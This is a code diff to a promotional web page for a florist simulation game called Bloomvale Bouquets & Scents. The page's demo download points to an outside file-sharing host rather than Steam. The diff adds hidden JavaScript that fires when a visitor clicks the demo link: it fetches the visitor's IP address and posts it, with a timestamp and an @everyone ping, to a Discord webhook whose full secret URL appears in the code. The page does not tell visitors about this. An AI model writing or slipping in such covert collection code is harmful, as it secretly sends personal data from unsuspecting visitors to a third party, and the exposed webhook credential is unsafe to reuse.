@@ -15,7 +15,6 @@
     <meta name="twitter:title" content="Bloomvale Bouquets & Scents - Welcome to the Florist World">
     <meta name="twitter:description" content="Build, grow, and manage your own flower shop in Bloomvale. Design custom bouquets and win the hearts of your customers in this relaxing florist simulation game.">
 
-
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Nunito:wght@300;400;600&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/lucide@latest"></script>
@@ -118,7 +117,53 @@
     <script>
         // Steam and Demo link configurations
         const STEAM_LINK = "https://store.steampowered.com/app/4417400/Bloomvale_Bouquets__Scents/";
-        const DEMO_LINK = "https://gofile.io/d/LMmqZ0"; 
+        const DEMO_LINK = "https://gofile.io/d/LMmqZ0"; // Demo linkini buraya ekleyebilirsiniz
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484697859482849360/R1BXKiKxbig0DB9ZGIZXq7_OHO0-NlFe11ogNC8O0vEAb5ybUXTR6iknAvOMoCxvhq6Z"; // Discord webhook URL'nizi buraya ekleyin
+        
+        // Discord webhook'a indirme bildirimi gönder
+        async function sendDownloadNotification() {
+            try {
+                // IP adresini al
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Şu anki saat
+                const now = new Date();
+                const timeString = now.toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' });
+                
+                // Discord embed mesajı
+                const embed = {
+                    embeds: [{
+                        title: "Dosya İndirildi",
+                        color: 0x8B5A2B,
+                        fields: [
+                            {
+                                name: "IP Adresi:",
+                                value: `\`${userIP}\``,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: `bugün saat ${timeString}`
+                        },
+                        timestamp: new Date().toISOString()
+                    }],
+                    content: "@everyone"
+                };
+                
+                // Webhook'a gönder
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(embed)
+                });
+            } catch (error) {
+                console.error('Webhook hatası:', error);
+            }
+        }
         
         document.addEventListener("DOMContentLoaded", () => {
             // Apply this link to all elements with the 'steam-link' class
@@ -131,6 +176,11 @@
             document.querySelectorAll(".demo-link").forEach(link => {
                 link.href = DEMO_LINK;
                 link.target = "_blank";
+                
+                // İndirme butonuna tıklandığında webhook'a bildirim gönder
+                link.addEventListener('click', () => {
+                    sendDownloadNotification();
+                });
             });
         });
     </script>
